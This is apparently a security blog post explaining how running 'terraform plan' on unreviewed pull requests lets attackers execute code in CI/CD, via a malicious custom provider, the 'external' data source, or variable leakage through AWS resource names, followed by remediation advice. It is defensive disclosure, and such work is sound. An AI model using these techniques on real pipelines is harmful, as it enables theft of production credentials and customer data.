---
layout: post
title: "Terraform Plan RCE"
date: 2021-05-11T11:00:00+00:00
author: alxk
sitemap: false
keywords: "security terraform cicd"
description: "Running a Terraform plan on unstrusted code can lead to RCE and credential exfiltration."
---

# Terraform Plan "RCE"

Based on a couple of recent conversations and blog posts on Terraform pull request automation, it seems that a lot of people don't realise that running a `terraform plan` on untrusted code can lead to remote code execution. If you're running a `plan` on production resources from untrusted code (say, on a pull request before it's been reviewed and merged to a protected production branch) then that untrusted code could run any commands it wants in your production CI/CD pipeline. This could lead to production credentials or customer data being exfiltrated, for example.

This also affects Terraform pull request automation solutions like [Atlantis](https://www.runatlantis.io/).

We'll start by discussing a couple of ways to do this before covering remediation.

## Setup

We'll assume there's a CI/CD pipeline for a repository that contains Infrastructure-as-Code. At some point after a PR is opened and before the PR has been accepted and merged to a protected production branch, the CI/CD pipeline runs a `terraform init` followed by a `terraform plan` on the production infrastructure.

People usually do this to see how a PR will affect production before it's merged.

It's not rare for companies to encourage developers to submit a PR to an infrastructure repository for infrastructure they need. That PR will then be reviewed and merged by a member of an Ops team. In these cases, it could be that anyone in the company with access to the VCS can submit a PR to the infrastructure repository.

In other cases teams may be running their own infrastructure end-to-end but still protect their production branch, and so expect production infrastructure changes to be peer-reviewed.

We'll now discuss how this approach to "production planning on the PR" can lead to arbitrary code execution in the CI/CD pipeline in the production context. An attacker who is in a position to open a PR can use this to exfitrate production credentials or customer data, bypassing defensive measures like production branch protections.

## Using a Custom Provider

Anyone can write a [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) and publish it to the [Terraform Registry](https://registry.terraform.io/). You could also try to pull a custom provider from a private registry.

That's it:

- write a custom provider than runs some malicious code (like exfiltrating credentials or customer data)
- publish it to the Terraform Registry
- add the provider to the Terraform code in a feature branch
- open a PR for the feature branch

```
terraform {
  required_providers {
    evil = {
      source  = "evil/evil"
      version = "1.0"
    }
  }
}

provider "evil" {}
```

Since the provider will be pulled in during the `init` and run some code during the `plan`, you have arbitrary code execution.

## Using the `external` Provider

A much more elegant solution was suggested by my colleague [Chongyang Shi](https://scy.email). Terraform offers the [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) which provides a way to interface between Terraform and external programs. You can use the `external` data source to run arbitrary code during a `plan`.

The following example is given by Terraform in the [docs](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source):

```
data "external" "example" {
  program = ["python", "${path.module}/example-data-source.py"]

  query = {
    # arbitrary map from strings to strings, passed
    # to the external program as the data query.
    id = "abc123"
  }
}
```

The `query` will be passed as a JSON string on `stdin` to the `program`; you could use this to grab variables from Terraform.

### Abusing Common Providers

After extending the discussion on a cloud security forum, a couple of people have suggested ways of exfiltrating variables by abusing common providers.

For example, as an attacker you could leverage the AWS provider to request a resource in another account you control and set the resource name to a Terraform variable. You could then check the CloudTrail logs in the other account to retrieve the value.

## Remediation

### `-plugin-dir`

By default, Terraform will search for, and install, plugins using default search paths. This includes pulling the plugins directly from the Terraform Registry. You can instead install the plugins yourself in a local directory and pass the `-plugin-dir` option to the `plan`:

```
$ terraform plan -plugin-dir /tf/plugins
```

This will prevent Terraform from dynamically pulling in new plugins.

If you're using Atlantis you may also be able to do this by modifying the default Atlantis workflows.

I have to caution that while `-plugin-dir` with whitelisted providers may be a mitigation against arbitrary RCE, it is unlikely to be sufficient to prevent exfiltration of variables via more creative ways (see "Abusing Common Providers" above).

### Read-only `plan` role

Ideally you use read-only roles for running your `plan`. This is not always practical though and note that even if you can pull this off in AWS or GCP, you may have other things (like database credentials) in your Terraform state file or environment that could be accessed by untrusted code.

### Don't do a production `plan` on untrusted code!

Just don't run a production `plan` on untrusted code! Only do a production `plan` on trusted code that's been peer-reviewed and merged to your protected production branch. Ideally you have a manual approval step after your production `plan` and before your production `apply`.

## Conclusion

A `terraform plan` is not as passive as you may think. If you run plans on PRs you could be opening a path to bypassing branch protections and your expected two-person process for production changes.

An attacker may only need to compromise one of your engineers to abuse the Infrastructure-as-Code CI/CD pipeline and move to production.
